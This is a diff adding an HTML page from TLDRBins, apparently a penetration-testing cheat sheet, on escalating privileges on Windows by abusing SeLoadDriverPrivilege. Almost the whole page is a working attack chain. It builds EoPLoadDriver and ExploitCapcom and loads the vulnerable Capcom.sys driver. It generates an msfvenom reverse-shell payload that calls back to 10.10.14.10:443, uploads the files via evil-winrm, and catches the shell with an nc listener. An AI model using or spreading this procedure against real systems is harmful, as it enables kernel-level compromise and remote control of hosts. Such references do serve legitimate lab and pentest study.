@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>SeLoadDriverPrivilege | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/seloaddriverprivilege/">
+      <span>SeLoadDriverPrivilege</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@seloaddriverprivilege/">SeLoadDriverPrivilege</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@privesc/">Privesc</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@backup-operators/">Backup Operators</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@diskshadow/">Diskshadow</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@secretsdump/">Secretsdump</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="seloaddriverprivilege">SeLoadDriverPrivilege</h3>
+<h4 id="compile-eoploaddriver">Compile eoploaddriver</h4>
+<p><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp">eoploaddriver.cpp</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">1. Open Visual Studio <span class="m">2022</span>
+</span></span><span class="line"><span class="cl">2. Create a new project
+</span></span><span class="line"><span class="cl">3. Project Template : C++ Console App
+</span></span><span class="line"><span class="cl">4. Project Name     : Eoploaddriver
+</span></span><span class="line"><span class="cl">5. Replace code     : eoploaddriver.cpp
+</span></span><span class="line"><span class="cl">6. Remove header    : <span class="sb">`</span>include <span class="s2">&#34;stdafx.h&#34;</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl">7. Release -&gt; x64
+</span></span><span class="line"><span class="cl">8. Build   -&gt; Build Solution
+</span></span><span class="line"><span class="cl">9. Exported to C:<span class="se">\U</span>sers<span class="se">\u</span>ser<span class="se">\s</span>ource<span class="se">\r</span>epos<span class="se">\E</span>oploaddriver<span class="se">\x</span>64<span class="se">\R</span>elease<span class="se">\E</span>oploaddriver.exe
+</span></span></code></pre></div><h4 id="download-capcomsys">Download Capcom.sys</h4>
+<p><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">Capcom.sys</a></p>
+<h4 id="compile-exploitcapcom">Compile ExploitCapcom</h4>
+<p><a href="https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom">ExploitCapcom</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">1. Double click ExploitCapcom.sln
+</span></span><span class="line"><span class="cl">2. Replace the payload to <span class="sb">`</span>TCHAR CommandLine<span class="o">[]</span> <span class="o">=</span> TEXT<span class="o">(</span><span class="s2">&#34;C:\\Windows\\Tasks\\rev.exe&#34;</span><span class="o">)</span><span class="p">;</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl">3. Release -&gt; x64
+</span></span><span class="line"><span class="cl">4. Build   -&gt; Build Solution
+</span></span><span class="line"><span class="cl">5. Exported to .<span class="se">\x</span>64<span class="se">\R</span>elease<span class="se">\E</span>xploitCapcom.exe
+</span></span></code></pre></div><h4 id="create-stageless-payload">Create stageless payload</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o rev.exe
+</span></span></code></pre></div><h4 id="upload">Upload</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example (evil-winrm)</span>
+</span></span><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">Eoploaddriver</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">Eoploaddriver</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">Capcom</span><span class="p">.</span><span class="py">sys</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">Capcom</span><span class="p">.</span><span class="py">sys</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">ExploitCapcom</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">ExploitCapcom</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><h4 id="exploit">Exploit</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Open a nc listener</span>
+</span></span><span class="line"><span class="cl">rlwrap nc -lvnp <span class="m">443</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">Eoploaddriver</span><span class="p">.</span><span class="py">exe</span> <span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">test</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">Capcom</span><span class="p">.</span><span class="py">sys</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">ExploitCapcom</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
